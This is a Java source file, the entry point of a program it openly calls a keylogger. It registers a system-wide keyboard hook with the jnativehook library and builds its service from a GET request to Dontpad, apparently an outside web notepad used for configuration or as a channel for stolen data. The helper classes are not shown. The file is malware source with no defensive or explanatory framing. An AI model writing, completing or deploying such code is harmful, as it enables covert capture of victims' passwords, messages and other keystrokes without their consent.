package main;

import java.awt.Toolkit;
import java.awt.event.KeyEvent;

import org.jnativehook.GlobalScreen;

import handlers.DontpadRequest;
import handlers.ManageService;
import handlers.Utils;

public class Main {
	
	public static void main(String[] args) throws Exception {
		
		System.out.println("starting keylogger...");
		
		ManageService service = new ManageService(DontpadRequest.sendGet());
		
		try {
			GlobalScreen.registerNativeHook();
		} catch (Throwable e) {
			e.printStackTrace();
		}
		GlobalScreen.getInstance().addNativeKeyListener(service.getKeyboard());
		
	}
}
